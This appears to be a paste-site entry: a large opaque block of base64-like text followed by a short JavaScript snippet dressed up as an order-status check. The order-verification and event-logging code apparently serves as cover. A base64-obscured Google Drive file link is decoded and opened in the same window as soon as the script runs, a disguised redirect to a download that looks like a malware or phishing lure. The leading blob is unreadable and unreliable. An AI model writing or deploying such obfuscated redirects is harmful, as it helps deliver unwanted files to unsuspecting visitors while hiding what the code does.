ZJlhTZFGGrXb7BihgNVDK3i223SoopmvHCUmtWqJnwOrthovg8ZVm6tgFQ4CsszfjglaQ9zWF2DIaJsX1EO1anR5YuJqrPEtOasxj3unReT3uCRAaCHSDjZ4wdbBpZ0jdCWb9CmTLqhTcj09iQNq3MEsJjVBi3nvYzU3oEeBSXeJeQ3deZ(Lb36UkIZbZM12FoRTRdqC24gKnVK81fMvYsHEeofSsYiCkprlQUcGVbGJnh7R(AHWT(riCKdbZHRfeRvTi3NFHLOmzIuN8GO0ZdwEP4gEx1Yc6NULdmG9w9MiLp)6pO)A13k9(rZdjyFeLi2GeFkSRB7DjYRblpjQqt6hbpry1f(U7vrvwlQISqqvB)IwpKYLNohN(4uT1FI(0pK6rx6EwpTw8S1PAjQ)0)2YPfWGcSF7v2IjxYyWDflZ(S(iEPgRD7t6Ded0nL1zklFbCjJnbjqiV1rUgfhLGIuPJxVAw)2o1VK16VDfBGVMm(zADIkTJNrcEY54hyILL7XpOfF8JRIPw2CkSMdWhT4lITHbWdgdCO8uI8HlQ58lGmWHFWHg4E(UWfSEqW5ni7lqcQObiDc)5zqpk(bqqaOLSHHbcGa502EKBoGzBVN1xspn39uud1vYjHw0qZzOT)guPf(WVAb4b8aLbpmIaJFi2r3TqeIqnpduTM6rfQL6X7)Zx(zFUDfSnP1MTj8ZmY0mlXfaoVFBW)(JG)DrlYqmMZX7TRUgYB)oDQzdXkYJHyrxV1nFRxT6EDdQo4Hbo(Ys3RxClfMjm6dEj0gUMbCxVJXgPBFJoSMTH3WYrByZ5WFBunpW)(VpNjSch(tJR2ylXq2Q2CQfcJTmpCg8lNsimZDtPdKPn)EhYoLMHzB0qWmzMTJ8Xd5sxiHnPAiHN27k0qcGp4LqB1WjBPTa0DuxdHgxZ2QBQeNFT5mwPBwnV7xoSw9U)qOnj8tFj0K8GUOIpDQ2oy1TCqnBsU5L0h5tRMKBrvpK2BCfQhsWh8sO5y3921rtvBBbILjHMnh3sHyo()lVR9OJJRY7A3RvCSYdhRuBh)kzIcorYrEJESw(rIrrVxfRhRxjzBHXvA2DhPzWR2DyMvYsHtaQlLJpCON24KWJ08amHK(4ahqfttchiut6FanqN4cjdn8i4ajTH2eWjLukus)((U351(qs2Xq5C6E8ATZm35E)M78D)997EVF3VB5uhVbRWpU(A7iJSPP0(BtQTSPuZziHBf0sDUh9Q7CpsjMoRwkjk8NjLu2ijCSIPKrNd0Pu7YgNU9m5YLwQtd5Ji1rNjhyqP4Dn8z7rn30zK2QuxZQNjxAf9RRtf58Q3GPuBPNroBkLBIowQdvzJjvKWzCEgfqkYLnVrUmsJKnTICAjdLP0GFzOVX4k5LYLvkoiKqcDVauaDUNtaIigVEbrZ6ITwb1YcQIVmRlNAwTkvRQ56wE74KIMxRhAE9bDJMuqdertiCEvfBx7w1vf2I48wvaB9uLvKUfRQfH24ACci8vzffvq4BYHOo32zw7q1ANqZQB26wS2DLuRW3(kcmmSwvcihT7mmS00IR27(nhS9DosJ7VFCTP0)kSIZSgQkRHxdOjc6xhlIrUPZNrlRc02cRGG7Q)N8YWkiDP0AM6zKNByF7(36JLxBkfXrHSdVoRR)mYtNphCKwQ9RLoVk04UiOQIQlXkqYppGktCtlG22k1RP8f4u5spgoyGJRF9LprzuMuo1CJnbO3zOcvq)S2Na0BaKeSYE9euLvKjOHT3znd5VENEtCu8wgs72v2ewTFAtv505oYbgCIjmvYZo)FD)a6Rz)kYhUTPnKn3vNXKItnAGwjw3C7ytkqx6etOnRsAQo8dCP6BOKpMInE9VdOhRFJLVIi9CzLNsl1y5vnumvZLj9C6xx5tTUHskntTCzz8LtBLgVRPnZRnXCT3xxDpCbd0)tjQsgLxLagSi1ThXDEK2781TJgME48DQmKAVZ7Ru1VthSeO1E2ChrAAtObEw4FeWcitstLBgTStkjNjJKV0kJnXtPerQQrZnTuk4wMaAKlLxvZusvXqzxsv1rodfPRxQlttLS51KZyk92Lgqo3ruhPxakGdDHNJNREv(ql)55pp0gEohoaBEu1rpsoJ073qw36LpwVNWux24W0RMvtgPXwjKX5ttxjrU8YORXecZWZMuo1HNeAwLnTBMgR1xO5MV1kQOIJJQxDNrEstRx5eAPYLDSuuAWQUZOKvozgLEmKtRH7zSyt8JcGx8CHfR1V59F)pXB(MVzSw)Pp33d382zGz4trca)LXOH0VYjf39Gg4)tsL19yf5yv7pO9uQa2tbUkuXBuQ4evTCRg2144UtXJsN63OAh(XPBj8Jj8giplQjJNO3UgAyiXFjVMxNXCQC5YRg3i3KGQP54CdGgYq7c4j1aBkmTHsI(vYKrdm2fYZqhawXFn0HBfM)N9d8RemNQeyojM)Y19OvggjkvThfPw5lJZJFzUHQt0D0C3NvUt7W3JkHmHiuCWkriK6u(J2NRVPgBOb9v7)u(dDO(xZNyKNQXDU9DSdN19P)yE6hH7SD0EdCbHA(tq6Q30qW1izo87Bne5gHpajUFBw4cUpBKvHt6)cNJP)H8N(s1tKZxaqQrrAJC69MTBJCO7vg0vfG)70MtNeabu4nDMrWPCEo8WyYgkYnHwY9XX0OrP4aMzgKP515oGthDZngHEJ4qDe4AIKmfml9Tltqmi1VouPBS8(Wff3F(50DS0z1L(6kkzzDVO)b4s)QlkH5dy0e5VceFlrgM3dFNydphsdwFlLs(8R4r1xJHsBcY0N1lvP(1Vy3e)Sjhy6Psc1uNHPFTLtS9mpO34ILRPHKoLCgV7je2baGTU(1uUAzVkXF6461voHOylAwV(ApTaUyiAByOP(gQ)ZqicTNrjB6(b2Ln1wNDwirkWeNNVjoyvjO7qfmqVopd0fyMyEknXu0Mun)UpDsWWGIHqpM6uWXjGCtT0kjs0BpXgM217UTHn3t0J0vtdgGoesLFLXRS5O7istwxC7dKlRIDO7vpMBSjPUQeHLeZ8gGTWi8QHARzZrAAInV5AKQFKSA5hc3YFIbuBvQTg08QIrn1v3ntbXeQtcRkSqK1sNwjBIb6AFDLGSE)nTUTvGwR1xva7wyDL1Zc9bbKURqLBtRtftzSYvD(CbmLWDBRsmYFHUhNihT36i236eExbd8LImadZYUUT19uAN9cn991x36aZNFi3FGdwV(vaigrIgHuxiZOLEdqyflsPUyLJnR2sNXxs5Y4TTKZ4J7yFVjqlnKWI2WC1A9A7f3ksMqoLY7e7hdOoakJVZr6DREhT1HWB4ydyh(vemt24kS6p2TwZjFVrN6z(Kiff7WVkXlXo8plave7W)Cm6XEwEhrd)AQCxT51VnijV8U21yatdgR90kMPQgSV)FcK9)fetIvxcMeU(BSWBvEYGrC2c5sqEu)mkQAPYO4UpQxLGOGGCHGsXP9L0r0C4B43FWiwhiteuGOUth(xEw)QWq3gGRcuD(vfXOWo8Vw84))8ReEdvvi)b2MbWCk659I44Omm1PfWQOJRZJGTZBcTjuMwpn8)U9ke6md6RUdp7Yg1TjnqNDimPM1lPmd0sQEjdOJYCK36LIejcpCePnbWkoVKBQPtMxvjRBGkYyAfjCx(hVa9FzYLsoJKI0ULqcuJPKDgFNofCALiaY0eAt670tHDVE30F8YiOSjrtA37wQM4912ODLySHI3vh92wF9(oAB4EhCGX6iwBd0txDwdLEGRErPVRbgURe9oqpJT)bt0xN1WfDk14hqsM2WaUfKqdjz4pgHQ9QThf60aXDTBxMddYRtCEAdiFjgzGUgl(G7hkZrI3zBd3fVSClkSNeAqr0y9TiLoN7P9QcGxCgWBH0OQbuy83hjuKtphCxGSGJJrh5aJm5os2A1Qlqo4(65GAhcs97jWfXpPuLZoPsA4A47R6l664AIOSxuxWlEyq)csunOTV01uC6uMvxJl8ddPasj9ijDJEptfDloxbsC5teo4jZcPqR4lnX0qVY2TxvvGeChEVNfVXeV1sfXmNrE(adfuHG0UX(7qPWFJeVgo1NSUIKdrglhPG6azOlHjl8Kb0lk8JOzvr50Tuu(uYSqjJPYIL34B5sFZ(QMehxxr1Ho)1FMbNlj1uWuV7fSHA9f1mPEPs2sfmTbWx0aeJDq6SCiU9jBOHVDmd7pOFQFtoVCKQf4Nm5KkgbJLA8ZjIOAvvvvb2)RWopCSvLKmvNGL0eAlQmlJFCBI)2dJq8ZBiN1mdICt9Ia6bXPDpv3GiO)tD1sCAZupVrWbe)DuObUsM8Yhq83rDrzDWkJqa4KItWtfH3miGYJlRmSiGgA1wYBzRsnw3wQ1Li5qYZOK(GodRLznh6GU3Lw6dDWAocoIc1Cii78YnD5uGPDp4p8fovtnhZA)HQEUqvpBiSxvE1hiybyYjPbYMtje0ZlEvz7mREpgqYOv0agCh2SDYSz7Ir7JfuwQAZU5XTz7ao9Tg640PWm70a3tzKS7q4zSzBNrr2o2TmB4oppR2pFSuzsNMQE9Dwd6Sq3ebHW5nQzW3veUt8CM0QDJWE6xo70acZCfdiWZueZl1bRbtBnrIyYFBgjsnhOMdvIupxzs9OfKAHoZS1l5HwIOgK8nd0btni3gcq)kNynJCMPX6SAHANmqxf6n9wr9lJDbgP4DhP26UXuGLuUodAwUHsjbnuppRQQSyxlE5rJ(1sR4OSPEFxZpGg81M92rDzspK0uhNRwZ1aPM3pi3KZIQRr3Xbe)Duhi0IAS6KbsBrQw(Tanv5xUU6CYTsMWrDs4ObOKCCsUfT84hGY9SSNQecTrJ1lnj8nj8vg(A0eCm8nj8vUPFR3aHF6KtIwVJa93isYjlKcPPdPm)K08D9U7H6KcP3JPfu27UhH2opfTxCkApykqcefNlWjdKkdLu0u)4LYAsioLiDEn6rKBsYd08j5K7AiL87tbhmrkxQviBGvP6DKZd2KVF3SVFh9q1fehXvGiEDCXQOMRcfUacpvCbpttfDMMl6mrpu5BLIp1riIyLKyJqkCROjjW7OMcCuZbokAqKlbkLse6QdbIxAZHuG(ubQALcf13BzunRaOXYjO6hCIjpueOpq8FmPZps68d5QwucxISQBFVI723R4U99kU7Ek9ZQpQyfaurdIjgA9yTXkEmnTzltLpol9RzyaOy0yAo4NO(UTd)JcBTP5X(oBOPJOb2H)bjbQ8AtpLDOvwjMG5jGFY60UGcH1pKeB2a4WdXAislZyTPK5Zn5KzumsRmH80zWHAALqhv)SvdCWnvG(2MA8MoSYCh3LGTnRE9RbZvtILUjWMxs2mf8CGtQcnQvrWs(m7ty6rctCzkCBwCB2EDktOhXjaIcdDk)wTWY7M8xEoxe0q0YAMhNP2CtiPMZq72ZLnpEEE5ZBebnsXbXW0P8tKbBeGvpTa1Yh)0ZiyGsgEg3PAljnRYfi0vIcCOLdc8TXcfIje6t0T7OjleFd6M7UhuYJ4Dvjc)w6iy)tmD6hk0foTS5Zjr3sejVsiwRp1gXpFBFLu7Ut5tGsQDEj5D1ZTsY3Zs7iqPiVpo)PGob8gGxBcv0qRs6fbp71YlPbVyOE1czEsfC(2GSNQCTzh0RgTBJCM5lFnAiYpfiPWMDiNNp6Mo3QjPBX)Zxi3Qs3F4vsJhOKo3QjlUK8)mKYPEK)mWRhTzk7ZPMX61joYCgwQo1tgJKvnxM5wOkQqfxrDu(DXRPUPLynf)EkDvvOIRIeLbVo6MwI1rLOm8l)ovsNqi)U1syvH(v6WUgrwgKq4m9QxEhovzNgXLKe8flbqZ2FgdZCtKVFTSVZkS2ucd0cRrsTjhkVIoRPPKN9R3Uj(tuQAAkTS9DrOcHi)arE58BxE2MjCrUixVE9ddTeKNcdJhy7cSlvkqdG8hrbQiuKtPkzIoHIjAwJqK0xhVdcsKLojFpC7k4tv8L1yKg2Ml8iny(ldEo2MVYFi9vxY(EGs2ADUcb8l5CjsimOt1ybvtShgmeKLgRqE2p7fFdxHnBoAcnevJBZMD7xbE2HixWPXdaI2hEzOiDaSqVYda1c4CKIvgearJrEySuo6sohhfYXqygokLHJwCg69e0ujEcohkRMqPVVWlG0305O030Ij9n5t6B(TM038bCkRYi8nFok8nVycFZ(e(OV1e(OOW37ci8rphf(OlMWh1NWVT3Ac)2qH)oxaHFBNJc)2wmHFB(e(wERj8TSycFlNJcFllMW3sKGZ(UnRsNPC3MbWSl3)eTBZUyCo23SnRAMN7C6n96pNAGzyFJvWNIDB21YNJDBwviD5RK2QdTz)bqoyB9DTzxQZKHBZUmXKE)0uuU5hB9tSzxUnBLwVeCZWLxfoB4Vg8OFjW9(mwxb5bOViiQREo0LqF9lZMTgB2A95HLSRYMToFt(RnB9Q8W3CLQwpUQnBl2SBu4OipG1dAT35B2O7jBS947OjL2Tz4EH0kJx522EKgJAZUAB21yh6ETz1GEyInBJ7MMo1V1rZbCEXH2B9aTWx5QHpB6vI16l9S4NFjs5yfQK)tDXqvHn76SzVnYPmVTLJtcR1NQebPkViuffSQ0TkXadeOp78zGa64d2VlIzOy(cG()GNIi54CQMPtXnPxtv3rvUJMBGPJb)jF6Pcm4UybEqVRXhI3Z551bE2gN8ov21dVeUbCgLRYMvhn9NwdCS1zZKH6YVX6HpR7nI1636bWppCSw)URd)ClWR8HH79dbQfVp4(FpWXPdmJL2SdxWX3nK277oTz7hsV(IK3hVxB2hhsVrb5XK4X)WF4ZxrfvS2yT(cMMVV38nFz48)HL58)jqEKTmx7J(e2ShaU(Fk89pd(ES7do5F8VguR0wqP7y96nlVHS6F1(NCx)ozqzNy3yT(VTZDooioXA9RDx31dsUsM4hORK5FsEVsNj5Lh46Sdnj5MyVbfun(nQffBPk9IbVkNO7PpNgR4W2rbEqMZ0aJtUmF6Kd)FnU7m7UitKl1sZXtW4TyftMlTjdUEEe6)05ZbDhDqNnmM37U95Gy8zc54KtrrbPjUFIrolfpqlXDxSJc9qyymB4HLjxNh7KQchDnbvivhL21RBz7n2W2S(cWt7VbeG30MvHRBI5iu2Spvn7E3yA8fp0oot43XfkhZVEB2dl8AF2dXdhuUYaoB1CHWM9Pbj4KQ8hWck8lKo4foyif7txlfRkBaWXlDitt1)EiWZxPJbhCFYLSd4BTc8AJtMDE6q(JDAV0YTE157DGb6kXyC)Y5NVoNDi3vWTxWTs46y)d633G278Zm3m7rUJU2FTTWTEaMjqOF04qadlO1b0N7lWbl4o7ZtUAY5c(mHDCnhYYX)e3AGJZZsMHC8)gFiJRV8Haj0PsoZzFTkOMZ33g3iuIHiNkj8R7aNYTX5h2a(I(T68Tp4Wdpy)uLIF3djwRpX1GFyL6hN5h1ZNRIkU0sGUyZ(Rq4LsTMAlawzvbHvm2FBj6BWo2Jh2Yc6vQleiZYlaKzXavofFAo5Ug8SHUdFoGL3Gz2XiDpwCY)QQxQRmZ47i(F72qMM99Lu6cm41E3bnk2EhUREnXydjihbhL1cNisV7OkFdyR)cNYy)NyPM1(Vh)zU)NzmV9D8snRlS6WzcHohq4DCvNIa4PLP3A9JKZrqdXr0r4t7qBv4RV4gil5jW3Z6RPLgSdFx4g(F472hg6jrm2KnV9OT0Wod6jW)(jm6M9TIRxCU5a6ibgkyMFjb9H1sXm3ouUkrywFuZR0HAoXzh3lYrk(VQD4xc7OaXnhG2F9k9J1wO7yU35p87iH5oYLS3mnK0p9DeV9u(vfrewKwoN4UGsELbwyCe6SalDL3VaZLOeqGUwCY3aKRD4QDOJxeMRhB0bR6y3GDyBXkJbmo0)twnN0LZUneN)EctC02yhnDUXOFXJ1SRbzYlwQEBc976JMurvEgTCgg68LRKV9AysfDl2H2PNFEBhAiYp50Yc9XWubJoRT3slBVz6K6k5r64QK)Jht2mUcoqL75QcFh)r01Pb)sjTQJVE7S747epxpfMih5bxnGgDnRsQPZR4UNhTXc2ZJ8wNoOw(nA9ZSd)91xvp5YRkp1aYgg5oYizYBihyT28lceISyB13Qdayu6T)adpUcALvWPwkq0V8Xx(40SedDGygfEGfsqj8h0l1zUW)qgcA8JSd)Fy9Y2H)xaD3WN5dCPu7V9546iIDkNK6gkqxGNpju3KsPtLuYZz17(WwxFzFPcokjpfLO1zyS9dUgdcUOyEA0RI5l7kFRdMUI3tIoKRRHoYCamuBf(L1VITSfCbRnLg86p7Kx7w2ID4)DV1CI3gFZlcnHo2w9u9Ws0v377gsOIJpTIoqY(CqZTpFX6DxR49iBEB2FlU)rDl7g3lPASbB2x0rFXr9Gc7OShtLwaOmC7)8P9RDk0lTz)DEXZc(oRTn7KCAXp44CfgrOl1M94oAtSVGkPqZvMqTEuxxOpzh(5GN5VNOBkFF9v3wQuAPrxooJuC4vg(7uZfqX6zcS7PlIrMorITcwPNGcLQJcfghadOcsBW0V5hPeAvLsdc0nSzFLsR0Cc5m6QYXNgSvwI1)fQJIHUyu50o8laqQOgXpEo7W)egTCnfRhu6vFbAxNMR25fD1278tT)ggEF9muhMXomQxvDxhiEFd2zxs9eBWr6tARsGfaIsxj1UGwkhRhpoHCS4(FQQl0zHppzd60xZV)M2eWjDTqAFUnSbGm4BuwYG(Hfwc0axZfikGx4yDS6c71M)Lx0vhyxMRHaumeSrqxgg6)28Bjr0D0ulBlz0OrBo62)94(SDUosGol2MlideyiFde4Zc0nGoF5msGJ7osGf0ZU9o)TNiDFBRr5E3FF591jpa3EqbTI1Rk6jNpgk8XTdivq0ew5YQIyqGnp)m8(X9pl4cqJOxFb5IW5xuAUfIUMDbaJ)fXrdahaHVCsWszcLPghxKzIfwRJ2hWFL4tyOmL7OECl7gvkBcovnn3GtSHUe4X2StDEH9Q(7oSxB2xBPJ5U6LcM73Uym3O7ST56yKTB2B3nIyUBirxDNORHIj1XGdmCIb7tAKb6SR26CPa(UKivwwB6BiGnDWYQtCdX3IeuScgrR8OAanUrXCx4FcB2N0HbG11FkKws7c6GajGXlW8D4XD6)dp8q4Z6ThBqB2xQ8S)cebF5V9PDyCh2FKcJpAFuWqLfHtWf3DeKZ7W9J9OQNx8)wynONyPt377us6EQ7rUTJS3zhU3PKf09wdNUNMPVquWIq6l4q8g7wFBp3up0)9GpYcSoEUYcnbpUNj4)1p2h7Rwrf1gR1VYvF1qsVHYoUmvxM10tHd)YWVTYy7LbibvIV2eRmy0C7J5Zmm9UF(o7Q)bhi2iO7N7B9(aVLDniRwSb5cc4fbnkhQeR63plTZECuAJfF6SkJ7TbWkw8VBMCXCLPO1Fi0jjWyTAW1cSD4VifRu(W2HpjGBGgVbiuOvv7yoY4BnfI17dniU7JJcNmAdrJ2su6sue33zH3(bbTwV2FUXXFoBGgfbZFV9Q8BWBVk3Xl7lPh2)BbEa8Wh3IXaGZt4yBWD7iVSX2fb3GZgYjkVyhkxWW8gZ6LwL)bM4PDI6YShH2hyNd4gCmWA(LKKVMiXcmBjIWZCgeuHYlgil9kNsSaxZoMCYKgkZOjNh6XS8SR2VGigdzq6E1tWhdzkAiWxZWBAbZlGfYAxOX8OGLGkFSo0xLVaebpcQigSzvKfdYnbSsT35t1qhg7TJ5ExDgFpLE2dDoW3MDtWvDkYPj09QFLUR5adf(ISU26CgJAo5fcS7zCgJAKV7cme1fS2i9nI1bx4NoJFnqrETNDo(I3pHsgzmqVGSJI16tE339NaW1I16JEvxfGAD5qxjOaFW)GdRPDBD3qjhE96xXqYPm0MqdNHraGnv(cJZl)nFr7WxgOBVs47fbFVy4l8eeE5W3QGVxc8u88WFVC47LQ6lKWC8LFEhvyUlAfVCGpWAOq0YhLVN1d1H9)RVCRtWJOt8G)YDoU1FbBHcbm3hyiZNQdO28x(wikGVDM19xtFjCcJm)1xdgfz(KWf(yxI1hpK1dFj48r)qwFAuh7W5FxX7Dpkr7zIIIXmxK1nB9j4rMOhX6JOIXtguNgd8m40O7gBz(ZRjrNbcPvx0VdcPvSNFHcPvizZ)FziTYHL9)hfsR2(27pED7yM39HJw7snKwHViVWhsRCbowLiktLtlJuTXnYLQoxKdurgHoq93YbiW3lWlpGanHWUH2iaqaBjJicN3BW3imcuxc1EaPWdmZZIt7h2Q1bG7YlaG7sfGEoaCvrGEfc8uMyGe2UWhUdGDb4oqtDFiiytDehqaHaGaa0g2ksGHayvfcCSCeIbWAqCdExY7yhtm5ohjZSJ2tFwxASV67(4D)(Xhlb6Klscay4bKuY9Rc3DQIRM2LLO9zFjbTV55Bcz0Aw1n4MqdE5NxL3fOl(XojFB33zM25ii8jzp0gOX2j(4IDImOaAXLANaX)c42sMtW7fqE(7le8bqKW4Dl8oPPGBPkvkc3TqFcEUdEW3pfzG(gJB9pwN1tnUtyVDf4Ut2gk1Cev2nPSfpO8k2X(bamVGYla8X3f0kx0)ninnmR8L9azVxQuaKGq8Qw3RpaYbD2KywJ1BmEzHj5DGjCWDFrSBPfpDdm(8sJWLvAFT(22nqDvuZ2JYgTxG5SXzq7Rylh0M3ttdNUD9DStJ20iSnomhT1(tBzgQb7fj7fqKVLbiFBJdZDixyo1I34mGtVovUXQQNzz3X)7p
CDeDgMBy,Untitled,x41w,JavaScript,Monday 24th of March 2025 03:33:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/395/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
